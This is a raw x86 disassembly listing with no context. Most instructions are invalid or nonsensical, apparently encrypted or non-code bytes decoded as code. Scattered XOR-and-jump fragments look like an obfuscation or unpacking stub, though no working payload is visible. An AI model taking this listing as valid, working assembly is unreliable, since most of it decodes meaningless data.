  407ae5:	addr16 jo 0x407a83
  407ae8:	sub    ecx,esp
  407aea:	adc    ebp,DWORD PTR [ebx]
  407aec:	adc    eax,DWORD PTR [edx+esi*2+0x4fb2a740]
  407af3:	cs jae 0x407b40
  407af6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407af7:	ficom  DWORD PTR [edi+0x79b37da2]
  407afd:	jge    0x407a81
  407aff:	and    al,BYTE PTR [eax]
  407b01:	imul   ebp,eax,0x5f5e09cb
  407b07:	jne    0x407a94
  407b09:	xchg   DWORD PTR [edx],edx
  407b0b:	dec    esi
  407b0c:	cmp    eax,DWORD PTR [ebx-0x17]
  407b0f:	add    BYTE PTR [esi],ch
  407b11:	(bad)  
  407b12:	xor    al,BYTE PTR [eax]
  407b14:	call   0x1da69a75
  407b19:	(bad)  
  407b1a:	dec    esi
  407b1b:	mov    bh,bh
  407b1d:	cmp    al,0x91
  407b1f:	and    esi,DWORD PTR ds:0xd7a4e6b0
  407b25:	fst    DWORD PTR [esp+esi*4]
  407b28:	and    DWORD PTR [eax],ebp
  407b2a:	or     edx,DWORD PTR [ebp+0x5e]
  407b2d:	outs   dx,DWORD PTR ds:[esi]
  407b2e:	cli    
  407b2f:	outs   dx,DWORD PTR ds:[esi]
  407b30:	sbb    al,0x7b
  407b32:	push   eax
  407b33:	daa    
  407b34:	adc    al,0x82
  407b36:	mov    ah,0x40
  407b38:	mov    dl,0xa2
  407b3a:	repnz or eax,esi
  407b3d:	push   cs
  407b3e:	sti    
  407b3f:	add    dl,BYTE PTR [ebx+0x1716ac0d]
  407b45:	xor    edx,ebx
  407b47:	mov    DWORD PTR [ebp+0x1c],edx
  407b4a:	mov    edx,DWORD PTR [edi]
  407b4c:	mov    DWORD PTR [ebp+0x8],edx
  407b4f:	mov    edx,DWORD PTR [edi+0x4]
  407b52:	xor    eax,esi
  407b54:	mov    DWORD PTR [ebp+0xc],edx
  407b57:	cmp    eax,DWORD PTR [ebp+0x8]
  407b5a:	jmp    0x407c32
  407b5f:	in     eax,dx
  407b60:	call   0x7e15d03a
  407b65:	in     eax,dx
  407b66:	stc    
  407b67:	ja     0x407b81
  407b69:	push   ebp
  407b6a:	aas    
  407b6b:	out    0x7b,eax
  407b6d:	mov    ss,WORD PTR [ebp+0x4565]
  407b73:	mov    ebx,0xfc000000
  407b78:	mov    WORD PTR [ecx],gs
  407b7a:	pop    edx
  407b7b:	(bad)  
  407b7c:	fdivr  DWORD PTR [ebp+esi*8+0x45]
  407b80:	xchg   ebp,eax
  407b81:	jmp    0x80f7:0x6357ea08
  407b88:	cmp    DWORD PTR [eax],ebp
  407b8a:	fidiv  WORD PTR ds:0xc6a30b83
  407b90:	jp     0x407bc1
  407b92:	jns    0x407b4e
  407b94:	xchg   BYTE PTR [ecx],dl
  407b96:	cmp    eax,0x8b827d27
  407b9b:	xchg   esi,eax
  407b9c:	inc    eax
  407b9d:	pop    ecx
  407b9e:	jno    0x407b98
  407ba0:	mov    ecx,0xbd0c9a5
  407ba5:	adc    BYTE PTR [ebx],ah
  407ba7:	jmp    0x42524644
  407bac:	clc    
  407bad:	dec    edi
  407bae:	push   cs
  407baf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407bb0:	jbe    0x407c0d
  407bb2:	test   al,0xc
  407bb4:	es scas eax,DWORD PTR es:[edi]
  407bb6:	xlat   BYTE PTR ds:[ebx]
  407bb7:	jle    0x407c11
  407bb9:	or     DWORD PTR [esi-0x6c4f7e47],ebp
  407bbf:	mov    dh,0xb1
  407bc1:	push   edi
  407bc2:	sahf   
  407bc3:	lods   eax,DWORD PTR ds:[esi]
  407bc4:	inc    ebp
  407bc5:	in     eax,dx
  407bc6:	push   esi
  407bc7:	cs mov esi,0x857de236
  407bcd:	loopne 0x407be2
  407bcf:	mov    eax,DWORD PTR [ebx]
  407bd1:	jg     0x407b94
  407bd3:	sbb    cl,BYTE PTR [ecx-0x3]
  407bd6:	and    DWORD PTR [edx+0x2ca33dd9],edi
  407bdc:	mov    eax,ds:0xca922141
  407be1:	out    dx,al
  407be2:	mov    ds:0xafa67e65,eax
  407be7:	push   ecx
  407be8:	dec    DWORD PTR [esi-0x1f]
  407beb:	sbb    ah,BYTE PTR [ebp+0x12e0199b]
  407bf1:	xchg   ebx,eax
  407bf2:	aaa    
  407bf3:	adc    eax,0xf2b2d5b6
  407bf8:	call   FWORD PTR [ecx-0x418da56a]
  407bfe:	add    BYTE PTR [eax-0x4b],0x1e
  407c02:	pop    ecx
  407c03:	inc    ebp
  407c04:	int    0xa4
  407c06:	mov    ecx,0x16a6c64e
  407c0b:	mov    edx,0xad91cc8d
  407c10:	ss cli 
  407c12:	ss clc 
  407c14:	cmp    ebp,DWORD PTR [eax+ebx*8]
  407c17:	fadd   st(3),st
  407c19:	(bad)  
  407c1b:	xchg   edx,eax
  407c1c:	scas   al,BYTE PTR es:[edi]
  407c1d:	mov    ecx,0x5146a371
  407c22:	xor    al,0x8a
  407c24:	push   es
  407c25:	mov    esp,0x5bfb3cc
  407c2a:	ins    BYTE PTR es:[edi],dx
  407c2b:	call   DWORD PTR [esp+ebx*4+0x46aa2e66]
  407c32:	jne    0x4084fc
  407c38:	mov    eax,edx
  407c3a:	jmp    0x407d12
  407c3f:	sub    eax,0x6fd76f2f
  407c44:	xlat   BYTE PTR ds:[ebx]
  407c45:	mov    ebp,0x277174ff
  407c4a:	pop    edi
  407c4b:	sbb    DWORD PTR [ebp+0x462039d2],ecx
  407c51:	add    BYTE PTR [eax],al
  407c53:	mov    ebx,0x43000000
  407c58:	imul   DWORD PTR [eax+0x1812a9a6]
  407c5e:	add    al,0x54
  407c60:	mov    ebx,0x32c94de6
  407c65:	sub    eax,0x4f65d9de
  407c6a:	enter  0xd5e9,0xe4
  407c6e:	add    esp,DWORD PTR [edi+0x2ab034b5]
  407c74:	and    ebp,DWORD PTR [ebx+0x4346a4d9]
  407c7a:	stc    
  407c7b:	jne    0x407cd0
  407c7d:	push   0x13012790
  407c82:	ss leave 
  407c84:	dec    esi
  407c85:	and    eax,0x3810c6bf
  407c8a:	sub    edi,DWORD PTR [eax+ecx*1+0x6e6d6964]
  407c91:	mov    eax,ds:0xbb69ea9b
  407c96:	xchg   edi,eax
  407c97:	dec    edi
  407c98:	loope  0x407c2f
  407c9a:	ins    BYTE PTR es:[edi],dx
  407c9b:	mov    dh,BYTE PTR [ecx+0x35d90dbf]
  407ca1:	es test al,0xa4
  407ca4:	sbb    bl,BYTE PTR [eax+0x47]
  407ca7:	xor    ah,bh
  407ca9:	cmp    eax,0x93ca2a5b
  407cae:	out    0x38,eax
  407cb0:	xor    ch,BYTE PTR ds:0x9bcb406d
  407cb6:	and    bl,BYTE PTR [ecx+0x6d]
  407cb9:	cmp    edx,DWORD PTR [ebp+ecx*4-0x14]
  407cbd:	adc    dl,al
  407cbf:	mov    al,ds:0x3fa996e2
  407cc4:	inc    edi
  407cc5:	pop    ds
  407cc6:	and    al,0xe7
  407cc8:	adc    BYTE PTR [esi+edx*1+0x31],bh
  407ccc:	outs   dx,BYTE PTR ds:[esi]
  407ccd:	cmp    cl,BYTE PTR [edi+0x52]
  407cd0:	call   0xc442:0xf5cc7e81
  407cd7:	pop    ss
  407cd8:	sti    
  407cd9:	pop    eax
  407cda:	popf   
  407cdb:	ja     0x407c89
  407cdd:	push   edx
  407cde:	jge    0x407cf6
  407ce0:	push   esp
  407ce1:	cli    
  407ce2:	(bad)  
  407ce3:	loopne 0x407ca2
  407ce5:	lods   eax,DWORD PTR ds:[esi]
  407ce6:	mov    esi,0xa773269
  407ceb:	mov    ebx,0xfdacdd29
  407cf0:	jmp    ecx
  407cf2:	loop   0x407d1a
  407cf4:	or     ebx,ebp
  407cf6:	add    al,BYTE PTR [ecx-0x80]
  407cf9:	cmp    bh,BYTE PTR ds:0xab8e9076
  407cff:	cdq    
  407d00:	and    ebx,DWORD PTR [eax+ebp*2-0x7a]
  407d04:	jmp    0x268b:0x40b1c15
  407d0b:	in     al,dx
  407d0c:	jns    0x407ca1
  407d0e:	push   eax
  407d0f:	mov    esi,ebx
  407d11:	mov    edi,DWORD PTR [ecx]
  407d13:	inc    ebp
  407d14:	sbb    al,0xf
  407d16:	test   ecx,esp
  407d18:	pop    es
  407d19:	add    BYTE PTR [eax],al
  407d1b:	mov    eax,DWORD PTR [edi]
  407d1d:	mov    edx,DWORD PTR [edi+0x4]
  407d20:	xor    eax,esi
  407d22:	xor    edx,ebx
  407d24:	jmp    0x407dfc
  407d29:	xor    ah,BYTE PTR [edi+0x4b]
  407d2c:	xor    al,0x5f
  407d2e:	cmp    al,0x7f
  407d30:	addr16 jmp 0x407cd7
  407d33:	xchg   edx,eax
  407d34:	dec    esi
  407d35:	cld    
  407d36:	pop    esi
  407d37:	loop   0x407da2
  407d39:	fild   DWORD PTR [esi+0x0]
  407d3c:	add    BYTE PTR [ebx-0x3e000000],bh
  407d42:	xor    DWORD PTR [edi],esp
  407d44:	pop    ecx
  407d45:	add    esi,ebx
  407d47:	xlat   BYTE PTR ds:[ebx]
  407d48:	in     eax,0xd7
  407d4a:	stos   DWORD PTR es:[edi],eax
  407d4b:	cmp    eax,0x71f3f99c
  407d50:	adc    DWORD PTR [esi+0x5e034320],ebp
  407d56:	and    edx,DWORD PTR [ebp-0x48]
  407d59:	stos   DWORD PTR es:[edi],eax
  407d5a:	mov    cl,BYTE PTR [edx-0x64cfd99]
  407d60:	pop    ss
  407d61:	das    
  407d62:	aas    
  407d63:	dec    esp
  407d64:	scas   al,BYTE PTR es:[edi]
  407d65:	jmp    0xec3:0xbb17
  407d6b:	xchg   ch,ch
  407d6d:	push   0xffffffd2
  407d6f:	sahf   
  407d70:	ins    BYTE PTR es:[edi],dx
  407d71:	mov    cl,0xa9
  407d73:	gs sub bh,BYTE PTR ds:[bp+di]
  407d78:	mov    ch,0x4f
  407d7a:	xchg   ebx,eax
  407d7b:	push   ebx
  407d7c:	adc    dh,BYTE PTR [edi+ebx*2+0x131144bd]
  407d83:	mov    eax,ds:0xb07a5e9b
  407d88:	inc    ebp
  407d89:	popf   
  407d8a:	xor    ebx,DWORD PTR [ebx+ebx*8]
  407d8d:	in     eax,dx
  407d8e:	(bad)  
  407d8f:	dec    ebp
  407d90:	stos   DWORD PTR es:[edi],eax
  407d91:	enter  0x9de4,0xd6
  407d95:	fcompp 
  407d97:	test   eax,ebp
  407d99:	(bad)  
  407d9a:	and    ch,BYTE PTR [edx+0xf]
  407d9d:	aaa    
  407d9e:	ja     0x407dc1
  407da0:	xchg   BYTE PTR [esi-0x5b],dl
  407da3:	out    dx,eax
  407da4:	push   ebx
  407da5:	pop    eax
  407da6:	lock and al,0x6f
  407da9:	or     dl,dh
  407dab:	pop    eax
  407dac:	icebp  
  407dad:	fist   DWORD PTR [esi]
  407daf:	jecxz  0x407d5e
  407db1:	lods   al,BYTE PTR ds:[esi]
  407db2:	lea    ebx,[esi]
  407db4:	ror    BYTE PTR [eax-0x54],cl
  407db7:	jns    0x407dcc
  407db9:	cdq    
  407dba:	ja     0x407dbc
  407dbc:	jo     0x407d42
  407dbe:	sub    cl,BYTE PTR [edi]
  407dc0:	lds    ebx,FWORD PTR [ecx+0x38981323]
  407dc6:	cdq    
  407dc7:	and    al,0xb2
  407dc9:	sti    
  407dca:	fdiv   QWORD PTR [eax]
  407dcc:	push   ecx
  407dcd:	add    bl,BYTE PTR [ebx-0x5e39db95]
  407dd3:	push   ebp
  407dd4:	inc    ebp
  407dd5:	dec    esp
  407dd6:	lods   al,BYTE PTR ds:[esi]
  407dd7:	int3   
  407dd8:	aaa    
  407dd9:	(bad)  
  407dda:	sub    eax,0x6f69a300
  407ddf:	pop    ss
  407de0:	sahf   
  407de1:	push   0x2d
  407de3:	sub    ecx,DWORD PTR [eax+0x3a430cfc]
  407de9:	inc    ebx
  407dea:	mov    ah,0xcb
  407dec:	mov    DWORD PTR cs:[ebx-0x5e],edi
  407df0:	pop    ecx
  407df1:	jne    0x407de5
  407df3:	popa   
  407df4:	(bad)  
  407df5:	popa   
  407df6:	mov    gs,WORD PTR [esi-0x2a595c61]
  407dfc:	add    eax,0x99b8624d
  407e01:	mov    DWORD PTR [ebp+0x8],eax
  407e04:	jmp    0x407edc
  407e09:	ss adc al,0x7a
  407e0c:	in     al,0x7a
  407e0e:	out    dx,al
  407e0f:	mov    esi,0x1b997bd6
  407e14:	dec    esi
  407e15:	and    bh,ah
  407e17:	jmp    0xbb00:0x4796c3
  407e1e:	add    BYTE PTR [eax],al
  407e20:	add    BYTE PTR [edi-0x49605084],bh
  407e26:	call   0x6feb:0xb4988ef9
  407e2d:	fs push es
  407e2f:	jge    0x407e2f
  407e31:	call   0xfc5d57b5
  407e36:	jnp    0x407e7a
  407e38:	cmp    al,0x4a
  407e3a:	dec    BYTE PTR [edi+edx*2+0x23686819]
  407e41:	sub    al,0x99
  407e43:	mov    eax,0xa3125842
  407e48:	mov    DWORD PTR [ebp+0x35],ebx
  407e4b:	ins    DWORD PTR es:[edi],dx
  407e4c:	jmp    0x5339ef13
  407e51:	sub    bh,cl
  407e53:	xchg   esi,eax
  407e54:	push   ebx
  407e55:	call   0xda428f53
  407e5a:	pop    ecx
  407e5b:	(bad)  
  407e5c:	dec    esi
  407e5d:	push   edx
  407e5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e5f:	fld    TBYTE PTR [edx]
  407e61:	or     al,0xb
  407e63:	inc    ebx
  407e64:	or     al,0x28
  407e66:	push   ebx
  407e67:	adc    esi,DWORD PTR [esi+ecx*2]
  407e6a:	call   0x27cc3437
  407e6f:	inc    ebx
  407e70:	loopne 0x407ed2
  407e72:	jp     0x407eb4
  407e74:	scas   al,BYTE PTR es:[edi]
  407e75:	cmp    edi,DWORD PTR [esp+ecx*4]
  407e78:	or     ecx,DWORD PTR [ebx-0x4d]
  407e7b:	imul   edx,DWORD PTR ds:0x871d1912,0xffffff9d
  407e82:	ins    BYTE PTR es:[edi],dx
  407e83:	sar    bl,1
  407e85:	sbb    bl,BYTE PTR [edx-0x80]
  407e88:	xchg   DWORD PTR [eax+0x3e],edi
  407e8b:	std    
  407e8c:	cmc    
  407e8d:	in     eax,dx
  407e8e:	and    eax,DWORD PTR [ebx-0x45541657]
  407e94:	and    ebp,DWORD PTR [ebx+0x692a8af]
  407e9a:	call   0x130d:0xdf81fafc
  407ea1:	out    0x73,al
  407ea3:	and    eax,0x8be798dd
  407ea8:	mov    al,ds:0x6b745247
  407ead:	jge    0x407eb4
  407eaf:	mov    eax,ds:0xea557c6d
  407eb4:	daa    
  407eb5:	not    esi
  407eb7:	mov    BYTE PTR [ebp+0x7c],al
  407eba:	pusha  
  407ebb:	pop    edx
  407ebc:	xchg   ebx,eax
  407ebd:	int    0x5e
  407ebf:	jns    0x407ecf
  407ec1:	xchg   ebp,eax
  407ec2:	cmp    DWORD PTR [edx+0x5b8f3bdb],edx
  407ec8:	pushf  
  407ec9:	test   dh,ch
  407ecb:	mov    eax,0x9e3ced1e
  407ed0:	fldcw  WORD PTR [edi+0x5]
  407ed3:	dec    ebx
  407ed4:	mov    al,ds:0x40218721
  407ed9:	mov    dh,0x73
  407edb:	ror    BYTE PTR [ebx-0x74ee743e],0x49
  407ee2:	add    al,0xe9
  407ee4:	rol    DWORD PTR [eax],cl
  407ee6:	add    BYTE PTR [eax],al
  407ee8:	and    eax,0x7d351d48
  407eed:	jne    0x407f1c
  407eef:	pop    eax
  407ef0:	mov    bl,0xd8
  407ef2:	and    DWORD PTR [edi],edi
  407ef4:	aas    
  407ef5:	add    al,0x9
  407ef7:	ret    
  407ef8:	push   ecx
  407ef9:	dec    eax
  407efa:	add    BYTE PTR [eax],al
  407efc:	mov    ebx,0xcd000000
  407f01:	sbb    BYTE PTR [ebx+0x64],cl
  407f04:	push   ecx
  407f05:	push   esi
  407f06:	repnz lds esi,FWORD PTR [ebx+eiz*1+0xf02aac8]
  407f0e:	xchg   ebx,eax
  407f0f:	sbb    ah,0xe4
  407f12:	clc    
  407f13:	les    eax,FWORD PTR [ebx-0x29a97b66]
  407f19:	in     eax,dx
  407f1a:	pop    es
  407f1b:	ret    
  407f1c:	call   0x22a6:0x9bf2d1f1
  407f23:	xor    ebx,eax
  407f25:	or     BYTE PTR fs:[edi],ch
  407f28:	das    
  407f29:	stc    
  407f2a:	jl     0x407f17
  407f2c:	mov    BYTE PTR ds:0xfe6174cc,al
  407f32:	stc    
  407f33:	dec    ebx
  407f34:	push   es
  407f35:	inc    esi
  407f36:	ss clc 
  407f38:	mov    ebx,0xfd6d446b
  407f3d:	clc    
  407f3e:	cwde   
  407f3f:	out    0xab,eax
  407f41:	fsub   DWORD PTR ds:0x28c45eef
  407f47:	int3   
  407f48:	cmp    bh,BYTE PTR [ecx-0x232cc78]
  407f4e:	hlt    
  407f4f:	jmp    0x59f5:0x221898a8
  407f56:	mov    ebp,0xf42af0a3
  407f5b:	dec    edx
  407f5c:	xor    DWORD PTR ds:0x7be83378,esi
  407f62:	inc    ebx
  407f63:	mov    bl,0xd4
  407f65:	and    BYTE PTR [edx-0x4e],al
  407f68:	sahf   
  407f69:	loopne 0x407fe0
  407f6b:	lgs    ebx,FWORD PTR [ecx]
  407f6e:	mov    ds:0x671aa34b,eax
  407f73:	jle    0x407f51
  407f75:	rcl    BYTE PTR [ebp-0x1d2a1645],0xa3
  407f7c:	cmp    esi,DWORD PTR [eax-0x68]
  407f7f:	dec    ecx
  407f80:	scas   eax,DWORD PTR es:[edi]
  407f81:	addr16 inc edi
  407f83:	ret    0xe6bd
  407f86:	mov    eax,ds:0x6ada8130
  407f8b:	or     DWORD PTR [eax],0x6b5f4f02
  407f91:	mov    esp,0xc16b72a8
  407f96:	sub    eax,0x51f61513
  407f9b:	or     DWORD PTR [edx-0x48425340],esp
  407fa1:	js     0x407f69
  407fa3:	aam    0x94
  407fa5:	xchg   esi,eax
  407fa6:	out    dx,eax
  407fa7:	ret    
  407fa8:	mov    eax,0x70415785
  407fad:	jg     0x407fbd
  407faf:	mov    ds:0x7a260cd1,al
  407fb4:	xchg   ebp,eax
  407fb5:	sar    cl,cl
  407fb7:	retf   0x45
  407fba:	ret    
  407fbb:	adc    eax,0x8ddc
  407fc0:	push   eax
  407fc1:	jmp    0x408099
  407fc6:	sbb    eax,0x9d909c94
  407fcb:	cwde   
  407fcc:	sbb    eax,0x7120f09d
  407fd1:	mov    eax,ds:0x39ba578f
  407fd6:	or     al,0x49
  407fd8:	add    BYTE PTR [eax],al
  407fda:	mov    ebx,0x22000000
  407fdf:	push   ds
  407fe0:	dec    ebx
  407fe1:	loopne 0x408031
  407fe3:	dec    esp
  407fe4:	rol    BYTE PTR ds:0xc26f9236,1
  407fea:	lods   al,BYTE PTR ds:[esi]
  407feb:	push   esp
  407fec:	(bad)
  407ff1:	mov    ebp,0x4832b28a
  407ff6:	adc    BYTE PTR [edi+esi*1-0x7a],ah
  407ffa:	in     eax,0x74
  407ffc:	cmp    edi,ecx
  407ffe:	scas   eax,DWORD PTR es:[edi]
  407fff:	(bad)  
  408002:	pop    ds
  408003:	icebp  
  408004:	sub    bl,dl
  408006:	sbb    esi,eax
  408008:	xchg   ebp,eax
  408009:	mov    ecx,ebx
  40800b:	add    ebx,ebp
  40800d:	xchg   ebp,eax
  40800e:	sahf   
  40800f:	adc    BYTE PTR [ecx],bl
  408011:	sub    al,0xb7
  408013:	outs   dx,BYTE PTR ds:[esi]
  408014:	nop
  408015:	adc    al,0x51
  408017:	(bad)  
  408018:	stos   DWORD PTR es:[edi],eax
  408019:	aam    0x79
  40801b:	cmp    DWORD PTR [edi+esi*2],ebp
  40801e:	into   
  40801f:	mov    al,0x1a
  408021:	and    al,0x81
  408023:	push   cs
  408024:	es ret 0x6dc3
  408028:	push   esi
  408029:	inc    ecx
  40802a:	retf   
  40802b:	inc    eax
  40802c:	adc    al,0x63
  40802e:	add    eax,0xc842c55c
  408033:	fwait
  408034:	sbb    DWORD PTR [eax+0x69],ecx
  408037:	cmp    esi,ebx
  408039:	mul    BYTE PTR [eax]
  40803b:	ins    BYTE PTR es:[edi],dx
  40803c:	or     al,0xd5
  40803e:	adc    dh,BYTE PTR [esi+edx*1]
  408041:	cmp    BYTE PTR [ebp+0x7f],bh
  408044:	mov    ah,BYTE PTR [esi-0x79]
  408047:	dec    eax
  408048:	mov    al,0x1e
  40804a:	and    eax,0x4801f08e
  40804f:	jne    0x40807d
  408051:	cld    
  408052:	jb     0x408014
  408054:	sub    eax,0xe7fa80e5
  408059:	xchg   edi,eax
  40805a:	or     ecx,DWORD PTR [ecx+0x1baf3732]
  408060:	push   ecx
  408061:	daa    
  408062:	int3   
  408063:	sbb    bh,BYTE PTR [eax+0x143cc0b0]
  408069:	mov    ah,0x57
  40806b:	jle    0x408043
  40806d:	adc    eax,0x7ddb5a6a
  408072:	jmp    0x408032
  408074:	scas   al,BYTE PTR es:[edi]
  408075:	mov    WORD PTR [eax],?
  408077:	inc    ecx
  408078:	xchg   esp,eax
  408079:	dec    esp
  40807a:	cmp    al,0xfd
  40807c:	mov    eax,eax
  40807e:	inc    ecx
  40807f:	xor    eax,0xd0132a48
  408084:	ret    0x4162
  408087:	arpl   WORD PTR [eax+0x70693ccb],ax
  40808d:	mov    ebp,0x8544ebec
  408092:	addr16 jle 0x40802e
  408095:	test   al,0x41
  408097:	in     al,0xf9
  408099:	push   DWORD PTR [ebp+0x8]
  40809c:	push   ecx
  40809d:	jmp    0x408175
  4080a2:	cmp    bl,BYTE PTR es:[eax+0x77ef9ccd]
  4080a9:	sti    
  4080aa:	sbb    ebx,DWORD PTR [ecx+0x649b9274]
  4080b0:	repz faddp st(7),st
  4080b3:	dec    ecx
  4080b4:	add    BYTE PTR [eax],al
  4080b6:	mov    ebx,0xa1000000
  4080bb:	jle    0x4080fe
  4080bd:	pop    ds
  4080be:	jp     0x4080dc
  4080c0:	(bad)  
  4080c1:	and    DWORD PTR [ecx],esi
  4080c3:	xchg   ebp,eax
  4080c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4080c5:	das    
  4080c6:	(bad)  
  4080c7:	mov    cl,0x3a
  4080c9:	aam    0xd3
  4080cb:	and    al,al
  4080cd:	bound  esi,QWORD PTR [ebp+0x7802f3cd]
  4080d3:	pop    ecx
  4080d4:	les    ecx,FWORD PTR [edx]
  4080d6:	test   eax,esi
  4080d8:	dec    ebp
  4080d9:	popa   
  4080da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4080db:	iret   
  4080dc:	dec    esp
  4080dd:	cmp    eax,ecx
  4080df:	mov    ds:0x5e228e71,eax
  4080e4:	ret    0x7a1c
  4080e7:	ins    BYTE PTR es:[edi],dx
  4080e8:	repnz xchg ah,ah
  4080eb:	cmp    eax,0x608a26dc
  4080f0:	mov    cl,0xb
  4080f2:	or     cl,BYTE PTR [edi-0x36]
  4080f5:	xor    al,0x62
  4080f7:	mov    edi,?
  4080f9:	stc    
  4080fa:	loope  0x40813e
  4080fc:	xchg   edx,eax
  4080fd:	scas   eax,DWORD PTR es:[edi]
  4080fe:	lea    edi,[ebp-0x4e4a49d8]
  408104:	mov    ah,0xbf
  408106:	scas   eax,DWORD PTR es:[edi]
  408107:	lods   al,BYTE PTR ds:[esi]
  408108:	push   ebx
  408109:	sbb    al,0x51
  40810b:	popa   
  40810c:	add    ah,0xcb
  40810f:	xlat   BYTE PTR ds:[ebx]
  408110:	lea    ecx,[edi]
  408112:	cmc    
  408113:	cmc    
  408114:	mov    ch,0x7c
  408116:	xchg   edx,eax
  408117:	shr    BYTE PTR [edx+ecx*8-0x21e5931],cl
  40811e:	mov    edx,eax
  408120:	push   eax
  408121:	hlt    
  408122:	rol    DWORD PTR [esi+0x75],cl
  408125:	(bad)  
  408127:	in     eax,dx
  408128:	mov    fs,WORD PTR [ebx+0x361d8f4f]
  40812e:	imul   ebx,esp,0x2879fa01
  408134:	add    bh,bh
  408136:	jle    0x4080db
  408138:	adc    eax,0xef0c8fdb
  40813d:	inc    esp
  40813e:	cmp    eax,esp
  408140:	mov    dh,0xb2
  408142:	enter  0x994d,0x43
  408146:	in     eax,0x8c
  408148:	mov    ch,0x76
  40814a:	jbe    0x40817d
  40814c:	cmp    eax,0x9fca8f29
  408151:	cmp    eax,DWORD PTR [edi]
  408153:	xchg   ebp,eax
  408154:	jp     0x408149
  408156:	sub    ecx,DWORD PTR [edi-0x77ec9e26]
  40815c:	jge    0x408181
  40815e:	sbb    al,0xfd
  408160:	out    0x19,eax
  408162:	fs je  0x4081b2
  408165:	lock outs dx,BYTE PTR ds:[esi]
  408167:	shl    DWORD PTR [esi+0x8],cl
  40816a:	push   esp
  40816b:	sub    DWORD PTR [ebp-0x7d],edi
  40816e:	cld    
  40816f:	pop    ebx
  408170:	pop    esi
  408171:	sub    bh,cl
  408173:	aas    
  408174:	cmp    DWORD PTR [edx-0x18],edx
  408177:	push   ebx
  408178:	imul   eax,DWORD PTR [edx],0xd3e900
  40817e:	add    BYTE PTR [eax],al
  408180:	stos   BYTE PTR es:[edi],al
  408181:	mov    dh,0x72
  408183:	in     al,0x7e
  408185:	in     al,0xbe
  408187:	(bad)  
  408188:	fisttp WORD PTR [ebp-0xf]
  40818b:	fisub  WORD PTR [ebx-0x7d210cd1]
  408191:	dec    edx
  408192:	add    BYTE PTR [eax],al
  408194:	mov    ebx,0x4f000000
  408199:	mov    ch,0x5f
  40819b:	xchg   ecx,eax
  40819c:	popa   
  40819d:	xchg   esp,eax
  40819e:	out    dx,al
  40819f:	sbb    al,0x7c
  4081a1:	(bad)  
  4081a2:	out    0xe8,al
  4081a4:	xchg   ecx,eax
  4081a5:	loope  0x4081b6
  4081a7:	pop    edi
  4081a8:	push   eax
  4081a9:	sbb    dh,al
  4081ab:	push   esi
  4081ac:	jae    0x4081cc
  4081ae:	add    esi,DWORD PTR [edi]
  4081b0:	dec    esp
  4081b1:	test   al,0x99
  4081b3:	out    0x31,al
  4081b5:	xor    esi,DWORD PTR [ebx]
  4081b7:	and    ch,dl
  4081b9:	mov    BYTE PTR [edi+0x74eeb8e1],bh
  4081bf:	mov    cl,0xa4
  4081c1:	mov    edx,0x686df344
  4081c6:	cmp    ch,BYTE PTR [esi+0x5ff49fba]
  4081cc:	jo     0x40824b
  4081ce:	or     ecx,DWORD PTR [edi+0x20]
  4081d1:	je     0x408228
  4081d3:	adc    DWORD PTR [ecx+edx*4-0x4daa4de3],ecx
  4081da:	push   ss
  4081db:	popa   
  4081dc:	shl    ch,0xf2
  4081df:	mov    ecx,0xb9dbd4c8
  4081e4:	pop    es
  4081e5:	xor    al,0x8b
  4081e7:	sbb    edx,DWORD PTR [ecx+0x6a]
  4081ea:	loopne 0x408229
  4081ec:	inc    ebx
  4081ed:	adc    bh,BYTE PTR [ecx]
  4081ef:	mov    dl,0xd5
  4081f1:	int3   
  4081f2:	xchg   DWORD PTR [esi],esp
  4081f4:	push   eax
  4081f5:	lahf   
  4081f6:	clts   
  4081f8:	sbb    DWORD PTR [ecx-0x72785e9e],esp
  4081fe:	ret    0xccc1
  408201:	mov    ch,bh
  408203:	std    
  408204:	(bad)  
  408205:	sbb    ah,al
  408207:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408208:	dec    ebx
  408209:	hlt    
  40820a:	pop    esp
  40820b:	mov    ds:0x2d5e1429,eax
  408210:	cs pop ss
  408212:	or     al,0x91
  408214:	mov    gs,WORD PTR [eax+0x60]
  408217:	jg     0x408246
  408219:	les    ebx,FWORD PTR [esi+0x5c]
  40821c:	inc    ebp
  40821d:	mov    ds:0x442bb327,al
  408222:	or     esi,DWORD PTR [esi-0x1]
  408225:	fadd   QWORD PTR [ebp+ecx*4+0x43]
  408229:	pushf  
  40822a:	cwde   
  40822b:	ret    
  40822c:	repnz int3 
  40822e:	cmp    BYTE PTR [ebp-0x33aac48a],0xe5
  408235:	aam    0xb2
  408237:	pop    ds
  408238:	xchg   edx,eax
  408239:	out    0xbf,al
  40823b:	in     al,0x9d
  40823d:	and    BYTE PTR [eax+0x1b],0x1b
  408241:	lods   al,BYTE PTR ds:[esi]
  408242:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408243:	gs pop eax
  408245:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408246:	push   ss
  408247:	lods   al,BYTE PTR ds:[esi]
  408248:	jmp    0x6765:0xb5ac9192
  40824f:	shl    DWORD PTR [ebx],1
  408251:	not    DWORD PTR [ebx-0x4cfaf075]
  408257:	popf   
  408258:	inc    edi
  408259:	jmpw   0x8330
  40825d:	add    BYTE PTR [eax],al
  40825f:	cwde   
  408260:	(bad)  
  408262:	jns    0x408239
  408264:	jns    0x408222
  408266:	std    
  408267:	xor    DWORD PTR [ecx+edx*2-0x221befcd],edx
  40826e:	xor    edi,DWORD PTR ds:0xbb00004b
  408274:	add    BYTE PTR [eax],al
  408276:	add    BYTE PTR [esp+ebp*8+0x5],ch
  40827a:	dec    ebx
  40827b:	pop    edx
  40827c:	mov    ?,WORD PTR [edi+0x69]
  40827f:	pop    ds
  408280:	js     0x408233
  408282:	push   esp
  408283:	bnd data16 je 0x408216
  408287:	int3   
  408288:	stc    
  408289:	or     eax,0x16204d76
  40828e:	jmp    0x4082df
  408290:	xor    BYTE PTR [ebp-0x612e7397],al
  408296:	cmp    ecx,DWORD PTR [esi]
  408298:	sbb    eax,0xec575c05
  40829d:	add    bh,BYTE PTR [eax-0x15656f2a]
  4082a3:	fild   QWORD PTR [ebx+0x4e87e4a2]
  4082a9:	inc    esi
  4082aa:	xchg   edx,eax
  4082ab:	sub    eax,0xbb69d027
  4082b0:	(bad)  
